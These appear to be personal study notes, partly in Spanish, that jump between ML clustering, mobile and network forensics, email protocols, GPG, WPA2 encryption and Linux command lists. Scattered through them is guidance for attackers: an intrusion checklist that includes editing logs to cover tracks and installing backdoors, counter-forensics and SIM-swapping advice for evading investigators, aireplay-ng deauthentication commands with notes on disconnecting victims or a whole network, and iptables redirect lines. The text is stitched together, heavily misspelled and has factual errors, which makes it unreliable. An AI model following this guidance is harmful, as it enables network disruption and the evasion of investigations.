  following examples:

  - Group stars by brightess.

  - Group organisms by genetic information into a taxonomy.

  - Group documents by topic

  Machine learning systems can then use cluster IDs to simplify the processing
  of large datasets. This, clustering's output serves as feature data for
  downstream ML systems.

  At Google, clustering is used for generalization, data compression, and
  privacy preservation in products such as Youtube videos, Play apps, and Music
  tracks.
  
  Generalization:

  When some examples in a cluster have missing feature data, you can infer the
  missing data from other examples in the cluster.

  For example, Less popular videos can be clustered with more popular videos to
  improve video recommendations.

  Data Compression:

  As discussed, feature data for all examples in a cluster can be replaced by the
  relevant cluster ID. This replacement simplifies the feature data and saves
  storage. THese benefits become significant when scaled to large datasets.
  Further, machine learning systems can use the cluster ID as input instead of
  the entire feature dataset. Reducing the complexity of input data makes the ML
  model simpler and faster to train.

  For example, Feature data for a single Youtuve video can include:

  - Viewer data on location, time, and demographics 

  - Comment data with timestamps, text, and user IDs

  - Video tags

  Clustering Youtuve videos lets you replace this set of features with a singles
  cluster ID, thus compressing your data.

  Privacy Preservation:

  You can preserve privacy by clustering users, and associating user data with
  cluster IDs instead of specific users. To ensure you cannot associate the user
  data with a specific user, the cluster must group a sufficent number of users.

  For examples, Say you want to add the video history for Youtube users to your
  model. Instead of relying on the user ID, you can cluster users and rely on
  the cluster ID instead. Now, your model cannot assosciate the video history
  with a specific user but only with a cluster ID that represents a large group
  of users.


  Mobile Forensics:

  Using moile communications as a tool in your planning and/or execution of the
  hack can provide you with a completely new set of options. Cell phones use
  several forms of signaling, one is the rafdio that links your phone to the
  closest antenna receiver, the next is the Bluetooth link that works for
  short-range connections, the GPS signal locator can be used for other
  functions, and lastly the phone has a digital connection capabilities. We want
  to focus on the digital portion of a cellphone.

  Inside a cell phone is a Subscriber Identification Module (SIM) cad that
  identifies your phone to you and your service provider. THis SIM card is also
  the same card that store of your phone mos semunbers and other text data. This
  card has an onboard microprocessor.

  Sim cards contain a special set of numbers known as International Mobile
  Subscriber Identity (IMSI). THe IMSI is the phone number for that device and
  can be thought of as a Machine Access Code (MAC) address for a celular phone.
  The first set of numbers of a MDN are assigned to the manufacture. SIM card
  editors like the ones available at Dekart will assist you in viewingthis
  number ser. (SIM MANAGER).

  Wireshark en source para que se ponga en número alfabético.

  La puerta de enlace predeterminada normally is 192.168.(network).1

  If you were going to onduct special business on a cell phone that might be
  traced, it is quite possible to have several SIM cards on hard. Changing out
  the cards after each call makes it nearly impossible to trace a cellular call.
  International SIm cards with preloaded calling credits are available in
  Europle, Korea, Japan, and other countries that do not have a cellular
  monopoly as in the United States.

  One point to consider is that cellular devices are tracked from cellular tower
  to tower, even if the device is just on. THis is part of the normal
  communication hand-off to ensure the cellular caller can make a connection
  quicly, at any time. In the near future, towers will track and maintain logs
  of wach cellular device that pass through their zones while communicating.
  This may sound contradictory to the paragraph above, however, the SIm card
  contains the hand-ser identifier. Changing out SIM chips is almost like
  changing out cellular devices.

  Short Message Service (SMS) are stored by each cellular phone carrier for
  several days or none at all. This shows how quicly evidence can disappear and
  timely response is critical. The messages are saved on the user's phone,
  usually on the SIM card or on the external memory card.

  Conect the Blue Wire to the Red Square:

  Another aspect of cellular digital communications is the ability to use Voice
  Over Internet PRotocol (VOIP). This communication tool uses VOIP software to
  create data voice communications between you and another VOIP user, bypassing
  cell phone sage charges. 

  Well, since VOIP is digital and a piece of software, we can encrypt the
  packets if you are using the Android OS. THe advanced Encryption Standard
  (AED) is a block cipher and can provide many levels of security. You will want
  to use the lowest encryption level, since VOIP is already going to be slow
  over a data phone.

  Some Disassembly Required

  Before you attempt to recover any data from a cellphone, turn off the celular
  signal, as in put the phone in "Airplane" mode. Celular providers can disable
  or deletele all data from a device if that device is reported as lost or
  stolen. Don't be that one person who forgets to disable the signal to the
  mother ship.

  Older devices used propietary cabled for charging and transferring data. These
  cables changed from device to device and never seemed to be interchangeable to
  anything. These days, most devices connect using a mini USB cable on one end
  and a standrd USB on the other. Apple products are the exception to this
  standard for "security" reasons.

  Cellular devices can store data in any one of three local areas. These areas
  are: The phone's built-in memory, the SIM card, and the external memory card.
  The good stuff (real evidence) isoften  located on the phone's internal memory
  and on the SIM card. SMS enabled devices often include software for
  "predictive text." Predictive text files can include portions or entire text
  messages that may not be located elsewhere.

  Besides the fact that cellular devices have Bluetooth, data transmission, and
  WiFI communication capabilitites, many are GPS enabled as well. All of these
  signals store information on the phone, the SIM card or on the external memory
  card. Forensic software allows an examination of each type of history,
  including the GPD. If the suspect enabled their GPD, all the waypoints and
  location history can be recovered to provide even more evidente.
  http://www.gpsvisualizer.com/ allows you to upload GPD data and it will create
  maps to show you where that where that data leads.

  Don't forget about the suspect's vehicle GPD as well as the on-board computer.
  Any vehicle built over the past decade has a diagnostic computer that tracks
  speed, fuel consumption, ignition sequence, pls more information that may help
  you solve the case. 

  iDevices: There are some folks have dedicated time and effort into open source
  projects such as IPBackup Analyzer. The purpose of this program is to look at
  data that is backed up on an Iphone and make it readable. One of the unique
  issues with Apple mobile products is the requirement for a back-up passcode.
  THe passcode can be bypassed using software tools, which will allow for
  examination of text messages, phone contacts, picture, video, emails and all
  evidence you might need to examine.

  http://www.nxtbook.com/nxtbooks/evidencetechnology/20120910/#/30

  Phone Software Tools

  Most of the major phone forensic software builders have found a niche market
  that allows them to charge a premium for their tools. There are a few open
  source and free products out there you might want to look into. Like anything
  else, each tool has pro's and con's but, you will need to have a working
  knowledge of several tools to be succesful.

  Oxygen: This software is capable of reading Iphone back ups, even if the data
  is protected by iTunes passwords.

  Bit Pim: This free software has one tiny drawback, the lack of support for
  newer smart phones.

  Sleuth Kit: Cellular forensics, it gives you the same capabilities as many
  commercial products.

  https://viaforensics.com/products/tools/ offers several free links to Android
  OS forensic tools. This site offers a book on Anroid Forensics plus several
  scripts for gathering your own data.

  https://viaforensics.com/iphone-forensics/howto-iphone-forensics-free-andor-open-source-tools-91411.html
  is a tool for forensics on apple.

  If a digital device is evidence in a case, do not turn off the device, this is
  critical if the phone is a pay-as-you-go since there isn't a signed contract
  with a mobile carrier. These phones are difficult to trace because they are
  disposable.

  of course you can't examine nor copy the SIM data without removing the
  battery. This is another reason to keep the cellular device powered by another
  way without relying on the battery. With out luck, the device battery will
  always be just about dead anywats.

  The forensic examination should be done using direct cables from the device
  yto your awesome lab computer. This means that all other communication means
  need to be shut off. Bluetooth, WiFi, GPS , and whatever else has to be turned
  off before an examination can begin. Failute to do so could render the
  evidense useless in a cour of law.

  Network Forensics:

  Network forensics are used to find out where a computer is located and to
  prove whether a particular file was sent from a pacticular computer over a
  network. 

  Firewall Logs

  Who's connecting to you?. The firewall is a utility that can control
  connections between two points in a network. There are many types of
  firewalls. Regardless of the firewall type and job of the firewall, it is the
  firewall logs, which five you the details. By using the logs you can find
  patterns of attacks and abuse to your firewall.

  As with any log file, the integrity of those files are essential. Think of log
  files as a smoking gun. Each file is stamped with time/date and certain
  propert rights. FIrewall logs are consiered "smart" logs because they are
  generated from a device that has perimeters and is not a simple hub or switch
  bos. Each packet is not recorder but each request and connection is recorded.
  You are looking for connections between specific IP addresses or the
  transmission of files between two connections.

  Packet Sniffers

  Packets of data flow through the veins of every networked dvice. SInce there
  are literally milions of packets moving between servers and other devices,
  looking at individual packets had always been thought to be impossible. With
  the increased power of computers and better software technology, we now have
  the capabilities to search through millions of transmitted packets to locate
  those that meet or requirements. We call this technique "packet sniffing."

  Packet sniffers come in all kinds of shapes and sizes but every type must be
  placed between the data flow transmissions. You can't head a conversation if
  you are not with the people who are talking. Packet sniffers can be active
  (looking) or passive (listening). The trick for an intruder is how to gather,
  store, and transmit those packets in your network without getting caught.

  Intrusion Detection Systems (IDS)

  This tempting name is a generic term for anything that can detect, alets, or
  shut down abnormal network activities. Snort is a perfect example of a program
  that can look for abnormal behavior in network traffic. 

  IDS were designed to be the watchdog of network traffic. Each type of IDS
  looks for protocols, signatures, ports and other locations where odd behavior
  might happen. SOme systems deny all and only allow authenticated users
  through, while othe IDS's bait and wait. The IDS's logs are full of wonderful
  details on odd behavior.

  Network Miner is used with Wireshark

  Router and Network Management Logs:

  There are a variety of open source software tools that should be part of any
  network evidence collectors kit, starting with the tried and true Wireshark.
  Since network traffic is data packets, or chunks of information, Wireshark
  captures and analyzes packets. Instead of making you going line by line
  through each packet to identify headers, routing information, sender , and the
  contents of each packet, Wireshark does all the heavy lifting for you.

  Netcat is another powerful open source program that analyses all network
  traffic including TCP and UDP, inbound and outbound, Ethernet and IP,
  including any service or port you'd like to look at. 

  Netcat has a hexdump utility built into the software and can capture/analyze
  packets.

  E-mail Headers

  E-mails come with information of every computer they pass through to get to
  you. This is added to the header portion of the email information. Sometimes
  the most important information is in the headers. To view the headers,
  however, is not always so simple. Various mail clients will all have different
  ways to view this. THe real trick to reading headers is to know they are read
  backwards. The top of the list is the receiver. Each toure the email travels
  goes with each line until the very last line is the computer or network that
  mail was sent from.

  This is only true if the email sender used their real email address to send
  it. Emails can be spoofed, IP addresses can be faked, and all sorts of other
  tricks might be used to disguise the real sender. THe header can provide some
  clues but don't expect to solve any cases based just on email header
  information.

  Within the email header, there is a segment called "Message-ID." THis set of
  characters is provided by the first email server then the message was sent.
  Since each ID is unique, proper logging can help you identify the location of
  the original sender. Look for the link listed right after the series of
  numbers and letter in the ID:

  THe sender "From" information in the header is configured by the email client
  and should not be considered reliable. Time stamps can also be misleading
  because email clients can be configured to send emails hours or days after the
  email was written. This is a technique known as "Delayed Send."

  Se puede clonar una MAC address conociendola para conectarse a una red, sin
  embargo, para poder tener incluso internet en la red conectada, se debe de
  cambiar a la misma IP. 

  A critical part of a hack is thinking through the entire process before
  touching the keyboard.

  How are you going to get inside your target?

  What controls do you need to disable or monitor during your network visit?

  What do you want and where is the location of your target?

  How are you going to transfer the data you want and where are you going to
  store it?

  What logs and audits needs to be restarted or edited as you exit to cover your
  tracks?

  Where are you planning to keep the new data for your safety and use?

  Social engineering is an excellent tool for gaining access to physical
  locations and networks. Recognizing it is a great way to be immune to (some or
  most of) it,

  Reconnaissance:

  Recon is learning the network vulnerabilitites, the types of servers you will
  be dealing with. What security measures are being used and what are their
  vulnerabilities. Can you turn those security devices to our advantage? Where
  are the network logs and audit logs kept? Are you going to install a backdoor
  for return work? What attack vectors are you comfortable using and will work
  accross each network?

  Software and Hardware vulnerabilities_

  You can locate all known exploits and vulnerabilities on all types of products
  by going to http://www.cvedetails.com or www.cve.mite.org. Both of these web
  sites should be part of your attack methodology as soon as you learn anything
  about the networks you will be dealing with.

  OpenVAS:

  OpenVAS is an open source vulnerability scanner and manager. The organization
  own Network Vulnerability Test (NVT) database is used to update the scanner on
  a daily basis. This "One-stop-shooping" for vulneabilities can be compared
  with CVE, without all the extra technical jargon. The software is a collection
  of tools that you can shape to fit your needs, even if you just want to know
  which vulnerabilities apply to an Apache web server.

  Attack Taxonomy is:::

  Attack Vector::

  Misconfiguration
  Kernel Flaws
  Design Flaws
  Buffer Overflow: Stack, Heap
  Insufficient Input validation
  Symbolic Link
  File Descriptor Attack
  ace Condition
  Incorrect Permission
  Social Engineering
  
  Operational Impact:: 

  Misuse of Resources
  User Compromise
  Root Compromise
  WEb Compromise
  INstalled Malware: Virues as System or MBR, File Infector or Macro
  Spyware
  Trokan
  Work: Mass Mailing, Network Aware
  Arbitrary Code Executiong
  Denial of Service: Host Based, Network Based or DIstributed

  Target::
  
  OS (Kernel/User/Driver), Family, Name or Version
  Network
  Local
  User
  Application as: Servers, Data Bases, Email or Web
  Client.

  Attack Vectos: These are methods to enter networks, using a variety of tools
  or known vulnerabilities. You will often see this term used alongside
  "malware", since attack vectors are mainly viewed as malicious network entry
  points by the security professionals. In our use of the term, we are merely
  showing you the types of ways to enter networks, in a specific category.

  Weapons to Hack Networks

  Blackgole is a package of "mouse click" exploits aimed at giving any hacker
  with any degree of skill, several ways to gain administrator access on a
  network. 

  THC-Hydra works to crack network logon passwords. THe program has an excellent
  use for switches inthe command prompt for LInux. THis program can be run
  through a proxy, through FTP, IRC, HTTP, and several other protocols.

  Metasploit has been around as a penetration testing software in the open
  source community. Metasploit has a large library of add-ons, plug-in, and
  configurations. Many security professionals have this software as part of
  their "have to have" toolbox.

  The Fedora Security Spin is another community project aimed at education and
  the safe testing of secutiry tools. 

  Cain and Able is the ultimate in Script Kiddie software. Cain was originally
  designed as a standalone program to recover passwords from SAM dumps (Windows
  password files). The program is still excellent at performing that same tast,
  just finding anyone running an old version of Windows is difficult. Able was
  added to increase the usefulness of the tool and buil a penetration-testing
  package. Cain and Able together offer really easy access to really insecure
  networks.

  Fyodor.

  Counter Forensics: 

  COunter forensic software tries to perform one or both functions of deleting
  all log files and/or erasing all data that could have been alteredduring a
  network visit. Both methods could ring very loud alarms if not used correctly.
  Counter forensic tools are mainly used on a single computer to remove, hide,
  cover-up, and generally make a forensic examiners job difficult or impossible.

  There are a few issues that need to be considered if you plan on using counter
  forensic software. The first issue is the examiners determination that counter
  forensic software was actually used on your machine. This alione would raise
  suspicion as to why anyone would use this software ifthey idn't have anything
  to hide.
  
  Second, locating and deleting every bit of data remnants from swap files, temp
  directories, pagefiles, and every speck of data that could link you to the
  hack.

  Third, forensic examiners are paid either by salary or by the hour. THey are
  primarily paid to prodiuce enough evidence to convict someone. If you have
  created an evidence recovery challenge that would take too long for any
  examiner to make a case against you, they will likely stop looking at some
  point. Time is money. Take your time to add more work for an examiner ahead of
  time.

  There are several opportunities for a criminal to use counter-forensic methods
  on a device. THese include:

  Many forensic examiners do not know how to deal with advanced users who can
  manipulate the operating system or hide data. The push for new igital forensic
  personnel has created a "shake n bake" process where the person attends a few
  classes and is handed a piece of software o use. This leaves so much
  experience needed to the wil of the software manufactures.

  Forensic software doesn't have a set standard for the scientific process of
  collecting, analyzing, and reporting a repeatable method. Different software
  will show different results. This, results cannot be replicated. 

  There is no common body of knowledge amongst digital forensic experts. This
  means there are several ways to slice an aples. There is no established method
  to conduct a digital forensic examination or even publish the results.

  Digital forensic examiners and software/hardware hasn't been designed for
  field environments. This stuff was created to be used in a nice clean lab,
  with perfect conditions, and all the tools you would ever need.

  A simple alteration to the evidence, such as a delayed file update or system
  time change would render the entire forensic collection useless. The data
  would not be accepted by a court of law because of a simple change.

  Current forensic laws, tools, and techniques do not work in a cloud setting.
  Because of the design in cloud computing, any forensic analysis will involve
  shared reources. What this means is when a forensic examiner attempts to
  retrieve suspected evidente, they are going to also grab data that belongs to
  other people, as well. THIs doesn't mean that an attack against one cloud
  service is going to o unreported or not investigated. The cloud provider will
  conduct their own investigation and look at legal issues. THe crimes that
  involve one account, one suspect, one victim, or one event are going to
  ebtricky because the cloud service may not be willing to help you out.

  Issues with Cloud Forensics:

  No jurisdiction over data. MOst cloud providers have redundant data centers
  located in several places throughout the world.

  Massive increase of cellular devices accessing/loading/creating/altering and
  moving data in the cloud. This means that data could be in several places at
  the same time.

  No celtral role for management to help filter out suspects. You do not own the
  data storage, you are just renting it.

  No acces control to keep data segreagated for a forensic investigation.
  Customers can get to that data at any moment, at any time.

  Lack of physical infrastructure to create a time-line or determine timestamps
  or log events.

  Terms and conditions between organization and Cloud provider may not allow a
  forensic investigation that will meet your requirements.

  Retrievel of evideceevidence without modifying it is extremely difficult.

  Each cloud service handldes their data storage and service conditions
  differently.

  If a crime was commited against the cloud provider, the provider has the
  jurisdiction over that criminal activity. THe cloud customer may have limited
  or no access to cloud data, more so, if the social media site owns that data.
  THis is the case with services such as Facebook, there the content isersu
  driven bur owned by the cloud service.

  Digital forensics is not an easy task, nor it is an easy profession. You must
  be detail oriente, able to document everything you do to the evidence you
  find, think like a criminal and have an enormous amount of patience to locate
  all evidence. Besides that ,you need to be willing and able to be an expert
  witness, if called to testify in a case.

  ON the other hand, some education and experience with forensics techniques and
  tools can help you maintain the privacy and confidentiality you've been losing
  fast in our digital world.

  If you were brave enough to complete this lesson, you know we discussed where
  media comes into play as source to hide data, boot up a computer and hide
  evidence within data or within the operating system. You were introduced to
  some very tricky places that data can be hidden and how to thwart forensic
  experts.

  Digital forensics is filled with areas that require expert knowledge or at
  least a fairly good understanding of that area. THis lesson was designed to
  provide you a taste of what you can expect if you want to work in this amazing
  field - or just be an informed computer user.

  Hacking email:

  Overall: How Email works:

  Email is created either using an email client such as Outlook, Mail, Eudora,
  Pegasus or Thunderbird. Or on a web service like Yahoo Mail, using a web
  interface. It's almost funny how much email mimics "snail mail," because your
  message is enclosed in an envelope.

  SMTP Envelope:

  R: 220 www.domain.net ESMTP Postfix 
  S: HELO mta.examples.com
  R: 259 Hello mta.examples.com, please to meet you

  S: MAIL FROM: <joe@examples.com>
  R:250 joe@domain.net... Sender ok

  S: RCPT TO: <sue@domain.net>
  R: 250 sue@domain.net ... Recipient Ok

  -----------------------------------------------------

  S: DATA
  R: 354 End data with "." on a line by itself

  Message Header:

  S: Subject: Wanna catch a drink?
  S: From: joe@example.com
  S: To: sue@domain.net
  Message Body
  S:
  S: Hey sue,
  S: How have you been ....
  S: .........

  ----------------------------------------------------
  
  R:250 Ok:queued as 31337

  S: QUIT
  R: 221 Bye

  You are sent to a mail server called a Mail Transmission Agent (MTA), which
  queues you for transmission. Modern mail systems do this tipically via
  encrypted SMTP (Simple Mail Transport Protocol) since they require
  authentication to prevent abuse, and encryption protects credentials from
  disclosure, along with the email contents. MTAs accepting email (you) without
  some sort of authentication are called "open relays" and tend to be abused by
  senders of junk mail, also known as UCE (Unsolicited Commercial Email) or
  spam.

  For each address ("recipient") in the message, the MTA first checks if a
  recipient is local (right on the same computer). If not, the MTA uses a
  so-called MX record to find the server for the relevant domain. If there is no
  valid receiving host found, a failure message for that specific address if
  sent back to the sender.

  The MTA attempts to deliver you to each address. If this fails, the MTA
  re-queues the message to try again later until timeout occurs and a delivery
  failure message is returned, usually in 48 hours. So you have to hang around
  for about two datys. This delivery may initially be deliberatly delayed by the
  receiving MTA as an anti-spam technique: spam software is typically less
  intelligent and will not queue an retry delivery (the technique is called
  greylisting). By defailt, this delivery takes place via unencrypted SMTP.
  Encrypted connections are the exceptions rather than the rule.

  Optionally, a mail relay picks you ip and routes you to your final
  destination. This typically happens in environments with spam and virus
  filtering and where security dictates a layered model, such as enterprise or
  government networks.

  The receiving MTA expands the address if it is an alias or a mailing list.
  These do not need to be in the same domain: an alias can expand into a whole
  new email address on another server. After expansion, you are re-queued for
  further delivery.

  When an email address refers to a local mailbox, you are now moved into that
  mailbox (unless the mailbox has exceeded its storage quota). 

  You are then picked up via the POP3 or IMAP protocol by webmail or a mail
  client. Here too, the connection is generally encrypted (with SSL) to prevent
  leaking login credentials; the protocols are POP3S and SSL IMAP. POP3 is a
   "pick up" process: it downloads messages, then deletes them from the server
  (this can be date driven). IMAP is a synchronization process that seeks to
  keep clients' mailboxes idential to what is on the server account (for mobile
  devices this is typically within a date rance to preserve device storage),
  which makes IMAP perfect to maintain email on multiple devices at the same
  time.

  FInally, most email clients now have junk mail detection built in, usually
  based on Bayesian, pattern scoring principles. 

  The Three Stages of Spam Filtering:

  Receiving servers first check on origin: an SMTP connection is refused from
  blacklisted servers.

  When a connection is accepted, email is then scanned for content. Some
  organizations are concerned they may have a message falsely marken as junk
  mail; they may require suspect email to be marked as junk, but still
  delivered.

  Finally, most email clients now have junk mail detection built in, usually
  based on Bayesian, pattern-scoring principles.

  You start at one place and may or may not end up at another place, depending
  on whether:
  
  You have the correct address
  You are too big
  You are spam
  The receiving mail box is too small
  You are too old
  
  When working in Linux and UNIX in general, *dig* is your best friend for
  testing DNS settings. MX records are very important to email delivery, so
  let's have a look at them briefly. MX records are for email, and have no
  relationship to websites for the same domain. 

  aireplay-ng -0 0 -a (MAC address de Access Point) -c (MAC de la víctima) -x
  150 (host)(127.0.0.1)(wlan) 
para desconectar a alguien de una red.
  
  The web server of "domain.com" may be a completely different system from the
  mail server, which is why those DNS recors are identifies differently. The way
  
  dig <domain name> MX

  tells dig to extract only mail exchange records from the relevant domain.

  dig <servername> <type>

  Para tumbar toda la red es :

  aireplay-ng -0 0 -a Mac AP -x 150 (host)(127.0.0.1:1)(wlan0mon)

  As an examples, the MX records for Google's gmail.com domain are:

  ;; ANSWER SECTION:

  gmail.com.           893   IN   MX   10 alt1.gmail-smtp-in.1.google.com
  -----------------------------------------------------------------------

  There are three values in each line that are of interest. The "893" is a time
  to live value (how many seconds, or how many routers to hop, depending) you
  will find in every DNS record- it indicated how long a DNS is allowed to cache
  the record before the information is considered stale and has to be retrieved
  again.

  The "10" in the top line, and numbers in the subsequent lines are "preference"
  values, followed by a Filly Qualified Domain Name (FQDN) of a system prepared
  to handle email. THe preference values are used by the MTA to decide which of
  the machines in the MX records list to try first, and which to contact next,
  should the first one fail or refuse email. If no servers is found to accept
  the email, a failure message is sent back to the email originator (using the
  "reply-to" or "from" information). Lower values indicate preferred MTAs. Thus,
  the last entry in the list above will be tried first, with the rest as
  fallback if the first system fails or is overloaded.

  A service can also offer records with identical preferences; here is the
  response from yahoo.com where the preferences evalue is set to "1" on all
  records.

  Doing this means the email load will be distributed over the 3 system equally.
  THe very low TTL value of "48" suggests this DNS entry is dynamicaly
  controlled, a sign of an active load balances. Load balancers fo pretty much
  that their name says they do: they make sure traffic (inbound, outbound, high
  priority, low priority) gets the level of attention it deserves.

  Last but not least, you can also identify whether the receiving domain uses
  mail filtering. 

  THe Risky Business of Email Composition:

  Disclosure: Tink about whom you are emailing, why and how. Not only is email
  transimssion by default insecure when it leaves the local MTA, you are also
  releasing information. THe use of encryption such as PGP, GPG and S/MIME
  requires both sides to be similarly equipped, and is generally perceived as
  very complicated to use. An alternative way to protect the transmission would
  be the use of the same email provider: that way, the message never needs to
  travel accross the Internet in an unencrypted form. This is where the how
  question appears: are you sure your provider or that of the recipient (or one
  or the other of your fovernments) is not listening in? Take that into
  consideration when you handle something confidential.

  Rerouting: An email address does not need to remain in the domain it is sent
  to, but could be redirected elsewhere. As an example, the US company pobox.com
  does not sell mailbox services, only aliases. THe main risk is that your email
  may th sutravel over various, different legal jurisictions before it arrives
  at its destination. In our example, a pobox.com alias will always go via MTAs
  in the US first, and is this at risk of interception under the ongoing abuse
  of the US PATRIOT Act.

  Privacy violations: A recipient using services such as Facebook or Google
  exposes his email to automated scanning of content, even though the sender
  never gave that permission!.

  DIstribution lists: if you use an email distribuiton list, use the BCC (Blind
  Carbon Copy) field for it. Email addresses in the TO : and CC: field are
  visible to every recipient of the email, and could end up giving away the
  contents of your email list to an uncontrolled third party, and expose your
  recipients to spam and other junk mail.

  Conflict: AN email is like a letter, but is written and sent much more quicly,
  which leaves you less time to consider its contents. 

  Misaddressing: ONe of the main causes of emai lgoing astray is misaddressing.
  THis is a consequence of mail clients trying to autofill an adress from the
  characters types by the user. Always check if the recipient is indeed the
  intended one.

  Multiple recipients: When you send email to more than one person, make sure
  the content is appropiate for all recipients. Also, it is good practice and
  ethically correct to visibly copy someone in if you use their information or
  tal about them.
  
  Legal issues: Disclaimers under your email may look impressive, but have no
  legal value other than a copyright notice. You sent the email, so you cannot
  disavow its content (to a degree, of course you could always claim its sender
  was spoofed) and you cannot prescribe what an incorrect recipient should do
  with an email because you probably don't have a contractual relation with
  them.

  It's possible to dañar a router with a lot of petitions per second when doing
  a MAC hack
  
  Receiving Email:

  Mail clients contact the servers on which mailboxes are stored, and check if
  the top message count has not changed. SOme clients do this periodically (for
  instance, every 30 minutes), some do it manually (usually to preserver
  bandwidth) and some maintain a simple permanent connection with the mail
  server so that they receive an update as soon as new email arrives (called
  push notification).

  When an email is inbound, the mail client or webmail environment will pick
  this up via POP3 or IMAP. Mobile clients usually download only the header and
  a small portion of the message to save bandwidth, leaving it up to the user to
  decide if the whole message should be picked up, left for later or deleted.

  Si se hace el ataque de MAC por 1 hora aprox, es capaz que el router se
  restaure a valores de fábrica.

  Cryptography Protecting Contents From Disclosure

  The simplicity of email makes it also vulnerable. THe sender cannot be sure
  that an email is not altered on its way to the recipient, there is no way to
  make sure that only the receiver can read it and a receiver cannot be sure it
  is actually sent by the person listed in them email as the sender.

  One way to ensure confidentiality is to encrypt a document before attaching it
  to an email. For example, it is possible to encrypt text documents and
  spreadsheets like those produced by OpenOffise, and PDF files support
  encryption too. However, applying cryptography to email itself is easier, and
  also allwos for the email contents to be secured.

  Email headers still need to be left in cleartext so that the mail servers can
  process and deliver the email.

  Email security can be provided in two different ways: using PGP (or GPG) and
  S/MIME. Both use encryption to assure:

  Confidentiality: can only the intended recipient(s) read this email?
  Integrity: Is the email content unchanged?
  Authenticity: Did the email really come from a particular sender?

  In general, authenticity and integrity are combined in electronically signing
  an email: the email gets checksummed, and the result is encrypted and embedded
  in an electronic signature that could only have been made by the person who
  holds the right private key.

  Confidentiality is assured by using someone's public key to encrypt the
  message body, so that only the holder of the correct private key can decrypt
  and read it. For extra assurance, such a message can be signed too.

  You should keep in mind that encrypted email is rather uncommon, especially in
  an era where people voluntarily let their email be scanned by comanies such as
  Google and Facebook. In some countries, you must make sure that you have the
  means to access your email when athorities demand this of you, for instance in
  the US by the TSA when you cross the border, and in the UK when served with
  warrant under the Regulation of investigative Powers Act.

  PGP and GPG:

  PGPG stands for Pretty Good Privacy.

  You are more likely to come across the Open Source version called GPG (GNU Privary Guard). GPG uses only open, publicly evaluated algorithms.

  GPG works on the principle of public/private key management, which means that
  keys have a PUBLIC part you can give to anyone who wants to send you encrypted
  email, and a PRIVATE part you have to keep sectret, which is the only way to
  decipher the message you have received. THe combination of private and public
  key is called a key pair, and it is generally the first thing you generate
  when you install GPG on a machine. THe key pair is protected by a password so
  that it cannot be altered by anyone but the owner. Alterations may be
  necessary because you want to change the email addresses the key supports, or
  want to make use of other functions.
  Because you need someone's public key to encrypt a message to them, servers
  such as pgp.mit.edu exist where you can download the key or keys associated
  with a specific email adress and upload your own. It is possible that keys
  have expired or password have been lost, so always use the latest key or eve
  better, ask your cecipient to send theirs and confirm the key fingerprint (
  ashort version of the checksum).

  MIME:

  MIME (Multi-Purpose Internet Mail Extensions) is an email extension of the
  SImple Mail Transfer Protocol (SMTP). MIME gives you the ability to transfer
  different types of media and data like audio, video, images, compressed files,
  and applications as attachments to email. The MIME header is inserted at the
  beginning of the email and the receiving email client uses this information to
  determine which program is associated with the attached file. MIME in itself
  does not provide any security to emails or attachments.

  S/MIME (Secure/Multipurpose INternet Mail Extensions) is a protocol that adds
  digital signatures and encryption to internet MIME message attachments. Using
  digital signatures, S/MIME allows for authentication, message integrity and
  non-repudiation of origin. "non-repudiation" means you can't deny you sent it.

  S/MIME provides privary and data security (using encryption) to emails that
  use this protocol. It is both a security tool and a security issue since users
  can send sensitive data or secrets as attachments to outbound emails in order
  to avoid detection. THerefore, the use of S/MIME in a corporate setting should
  be carefully monitores on the email servers.

  Key Trust:

  How do you ensure that a key for an emil recipient is really theirs, and not
  uploaded by someone else? The solution to this is that keys can be signed by
  others. Imageine you already have the key of someomne else who you trust, and
  who knowns the person you want to email with. THat other person can sign the
  public key, which means you invest a bit more trust in the key, provided you
  know this other person. THis is known as inherited trsut. You can also find
  another way to get in touch with the person and either receive their full
  public key, or receive the key "fingerprint" - a checksum of the key which is
  quick to verify. On a key server, a key can also have an ID - yet another
  checksum serving the same goal.

  Sending An Encrypted Email using GPG:

  Most email clients support plugins that mek the handling of keys and
  encryption easier. The best thing to do is to check beforehand if you
  recipient has a public  key and get it from a key server, or from the
  recipient themself.

  THen, compose your email as normal (once again we strongly recommend plain
  text email over HTML). add any attachments and tell your email client to
  encrypt and send the email. If you decided to sign the email, the email client
  will use your private key to sign the message first, then use the public key
  of your recipient to encrypt the email and any attachments. If you protect
  your key pair with a passphrase, your email client will ask for that
  passphrase.

  Fluxion is used to scan nearby networks.

  If CIPHER = CCMP:

  CMP (Cryptography)

  Counter MOde Cipher Block Chaining Message Authentication Code Protocool is an
  encryption protocol designed for Wireless LAN products that implements the
  standards of the IEEE 802.11i amendment to the original IEEE.802.11 standard.
  CCMP is an enhanced data cryptographic encapsulation mechanism designed for
  data confidentiality and based upon the Counter Mode iwth CBC-MAC (CCM Mode)
  of the Advanced Encryption Standard (AES) standard.

  CCMP is the standard encryption protocol for use wit hte Wi-Fi Protected
  Access II (WPA2) standard and is much more secure than the Wired Equivalent
  Privacy (WEP) protocol and Temporal Key Integrity Protocool (TKIP) of Wi-Fi
  Protected Access (WPA). CCMP proides the following security sevices:

  Data confidentiality: ensures only authorized parties can access the
  information.

  Authentication: provides proof of genuineness of the user

  Access control in conjunction with layer management.

  Because CCMP is a block cipher mode using a 182-bit key, it is secure against
  attacks to the 2^64 steps of operation. Generic meet-in-the-midle attacks do
  exist and can be used to limit the theoretical strength of the key to 2^n/2
  (where n is the number of bits in the key) operations needed.

  Known attacks:
  
  For cryptographers, a cryptographic "break" is faster than a brute-force
  attack - i.e, performing one tril decryption for each possible key in sequence
  (see Cryptanalysis). A breack can thus include results that are infeasible
  with current technology.

* Operating Systems
** GNU/Linux
*** Commands

    #+BEGIN_SRC bash

    curl
    ## Is the HTTP tool kit
    id
    ## Informations about groups, or a target and DNS
    whois
    ## Information about a target by its DNS or IP
    ping
    ## Response for a reachable network, and information about it
    dig 
    ## DNS records directly
    host
    ## IPv4, IPv6 and mail of a target
    nslookup
    ## Similar functionalities
    traceroute
    ## Information about a target

    #+END_SRC

**** Networking

   #+BEGIN_SRC bash

   ifconfig ## configure network interface
   route ## show/manipulate the IP routing table
   cat /etc/resolv.conf ## displays DNS information
   cat /etc/network/interfaces ## displays the network interface configuration
   cat /etc/hosts ## static values for hostnames lookups
  'echo "1" > /proc/sys/net/ipv4/ip_forward' ## allows ipv4 forwarding
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
   ## Redirects all 80 port traffic to port 9000
    iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT
    --to-port 53
   ## Redirect UDP port
   
   #+END_SRC

